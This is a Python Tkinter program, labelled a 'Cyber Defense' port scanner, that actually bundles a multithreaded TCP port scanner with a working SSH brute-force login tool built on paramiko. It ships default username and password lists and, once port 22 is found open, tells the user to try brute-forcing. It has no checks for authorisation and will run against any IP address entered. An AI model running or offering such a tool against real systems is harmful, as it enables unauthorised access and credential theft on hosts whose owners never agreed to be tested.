import socket
import threading
from queue import Queue
import paramiko
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from datetime import datetime

class CyberSecurityTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Accurate Cyber Defense Port Scanner Gui")
        self.root.geometry("800x600")
        
        # Apply blue theme
        self.setup_theme()
        
        # Variables
        self.target_ip = tk.StringVar()
        self.port_range = tk.StringVar(value="1-1024")
        self.thread_count = tk.IntVar(value=50)
        self.username_list = tk.StringVar(value="admin,root,user")
        self.password_list = tk.StringVar(value="password,123456,admin")
        self.scanning = False
        self.bruteforcing = False
        
        # GUI Setup
        self.setup_gui()
    
    def setup_theme(self):
        self.root.configure(bg="#e6f3ff")
        
        # Define blue theme colors
        self.bg_color = "#e6f3ff"  # Light blue background
        self.frame_color = "#cce0ff"  # Medium light blue
        self.button_color = "#4da6ff"  # Bright blue
        self.button_active = "#3385ff"  # Darker blue
        self.text_bg = "#ffffff"  # White
        self.text_fg = "#003366"  # Dark blue
        self.highlight_color = "#0052cc"  # Deep blue
        
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure styles
        style.configure(".", background=self.bg_color, foreground=self.text_fg)
        style.configure("TFrame", background=self.frame_color)
        style.configure("TLabel", background=self.frame_color, foreground=self.text_fg)
        style.configure("TLabelFrame", background=self.frame_color, foreground=self.highlight_color)
        style.configure("TButton", 
                        background=self.button_color, 
                        foreground="#ffffff",
                        bordercolor=self.button_color,
                        lightcolor=self.button_color,
                        darkcolor=self.button_active,
                        focuscolor=self.frame_color)
        style.map("TButton",
                 background=[('active', self.button_active)],
                 lightcolor=[('active', self.button_active)],
                 darkcolor=[('active', self.button_active)])
        style.configure("TEntry", 
                       fieldbackground=self.text_bg,
                       foreground="#000000",
                       insertcolor="#000000")
        style.configure("TScrollbar", 
                       background=self.button_color,
                       troughcolor=self.frame_color,
                       arrowcolor="#ffffff")
        
    def setup_gui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Target IP Section
        ip_frame = ttk.LabelFrame(main_frame, text="Target Information", padding="10")
        ip_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(ip_frame, text="Target IP:").grid(row=0, column=0, sticky=tk.W)
        ttk.Entry(ip_frame, textvariable=self.target_ip, width=30).grid(row=0, column=1, sticky=tk.W)
        
        # Port Scanning Section
        scan_frame = ttk.LabelFrame(main_frame, text="Port Scanning", padding="10")
        scan_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(scan_frame, text="Port Range:").grid(row=0, column=0, sticky=tk.W)
        ttk.Entry(scan_frame, textvariable=self.port_range, width=15).grid(row=0, column=1, sticky=tk.W)
        
        ttk.Label(scan_frame, text="Threads:").grid(row=0, column=2, padx=(20,5), sticky=tk.W)
        ttk.Entry(scan_frame, textvariable=self.thread_count, width=5).grid(row=0, column=3, sticky=tk.W)
        
        self.scan_btn = ttk.Button(scan_frame, text="Start Scan", command=self.start_scan_thread)
        self.scan_btn.grid(row=0, column=4, padx=(20,0))
        
        # Bruteforce Section
        brute_frame = ttk.LabelFrame(main_frame, text="SSH Bruteforce (Port 22)", padding="10")
        brute_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(brute_frame, text="Usernames (comma separated):").grid(row=0, column=0, sticky=tk.W)
        ttk.Entry(brute_frame, textvariable=self.username_list, width=50).grid(row=1, column=0, columnspan=3, sticky=tk.W+tk.E)
        
        ttk.Label(brute_frame, text="Passwords (comma separated):").grid(row=2, column=0, sticky=tk.W)
        ttk.Entry(brute_frame, textvariable=self.password_list, width=50).grid(row=3, column=0, columnspan=3, sticky=tk.W+tk.E)
        
        self.brute_btn = ttk.Button(brute_frame, text="Start Bruteforce", command=self.start_bruteforce_thread)
        self.brute_btn.grid(row=4, column=0, pady=(10,0))
        
        # Results Section
        result_frame = ttk.LabelFrame(main_frame, text="Results", padding="10")
        result_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.result_text = scrolledtext.ScrolledText(
            result_frame, 
            wrap=tk.WORD, 
            width=80, 
            height=20,
            bg=self.text_bg,
            fg="#000000",
            insertbackground="#000000",
            selectbackground=self.highlight_color,
            selectforeground="#ffffff"
        )
        self.result_text.pack(fill=tk.BOTH, expand=True)
        
        # Status Bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(
            main_frame, 
            textvariable=self.status_var, 
            relief=tk.SUNKEN,
            background=self.button_color,
            foreground="#ffffff",
            anchor=tk.W
        )
        status_bar.pack(fill=tk.X, pady=(5,0))
    
    def log_message(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.result_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.result_text.see(tk.END)
        self.root.update()
    
    def update_status(self, message):
        self.status_var.set(message)
        self.root.update()
    
    def start_scan_thread(self):
        if self.scanning:
            return
        
        target_ip = self.target_ip.get()
        if not target_ip:
            messagebox.showerror("Error", "Please enter a target IP address")
            return
        
        try:
            socket.inet_aton(target_ip)
        except socket.error:
            messagebox.showerror("Error", "Invalid IP address format")
            return
        
        thread = threading.Thread(target=self.start_port_scan, daemon=True)
        thread.start()
    
    def start_port_scan(self):
        self.scanning = True
        self.scan_btn.config(state=tk.DISABLED)
        target_ip = self.target_ip.get()
        port_range = self.port_range.get()
        thread_count = self.thread_count.get()
        
        try:
            start_port, end_port = map(int, port_range.split('-'))
        except ValueError:
            self.log_message("Invalid port range format. Use 'start-end' (e.g., 1-1024)")
            self.scanning = False
            self.scan_btn.config(state=tk.NORMAL)
            return
        
        self.log_message(f"Starting port scan on {target_ip} (ports {start_port}-{end_port}) with {thread_count} threads")
        
        open_ports = []
        queue = Queue()
        
        # Put ports in the queue
        for port in range(start_port, end_port + 1):
            queue.put(port)
        
        def port_scan(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    self.log_message(f"Port {port} is open")
                sock.close()
            except Exception as e:
                pass
        
        def worker():
            while not queue.empty():
                port = queue.get()
                port_scan(port)
                queue.task_done()
        
        # Create and start threads
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        queue.join()
        
        self.log_message(f"Scan completed. Found {len(open_ports)} open ports.")
        if open_ports:
            self.log_message(f"Open ports: {sorted(open_ports)}")
            if 22 in open_ports:
                self.log_message("SSH port (22) is open. You can try bruteforcing.")
        
        self.scanning = False
        self.scan_btn.config(state=tk.NORMAL)
    
    def start_bruteforce_thread(self):
        if self.bruteforcing:
            return
        
        target_ip = self.target_ip.get()
        if not target_ip:
            messagebox.showerror("Error", "Please enter a target IP address")
            return
        
        try:
            socket.inet_aton(target_ip)
        except socket.error:
            messagebox.showerror("Error", "Invalid IP address format")
            return
        
        thread = threading.Thread(target=self.start_ssh_bruteforce, daemon=True)
        thread.start()
    
    def start_ssh_bruteforce(self):
        self.bruteforcing = True
        self.brute_btn.config(state=tk.DISABLED)
        target_ip = self.target_ip.get()
        
        usernames = [u.strip() for u in self.username_list.get().split(',') if u.strip()]
        passwords = [p.strip() for p in self.password_list.get().split(',') if p.strip()]
        
        if not usernames or not passwords:
            self.log_message("Please provide both usernames and passwords")
            self.bruteforcing = False
            self.brute_btn.config(state=tk.NORMAL)
            return
        
        self.log_message(f"Starting SSH bruteforce on {target_ip}:22")
        self.log_message(f"Trying {len(usernames)} usernames and {len(passwords)} passwords")
        
        found = False
        
        for username in usernames:
            if found:
                break
            for password in passwords:
                if found:
                    break
                try:
                    self.update_status(f"Trying {username}:{password}")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target_ip, port=22, username=username, password=password, timeout=5)
                    self.log_message(f"\nSUCCESS! Found credentials - {username}:{password}\n")
                    found = True
                    ssh.close()
                except paramiko.AuthenticationException:
                    self.log_message(f"Failed: {username}:{password}")
                except Exception as e:
                    self.log_message(f"Error: {str(e)}")
                    continue
        
        if not found:
            self.log_message("\nBruteforce completed. No valid credentials found.")
        
        self.bruteforcing = False
        self.brute_btn.config(state=tk.NORMAL)
        self.update_status("Bruteforce completed")

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberSecurityTool(root)
    root.mainloop()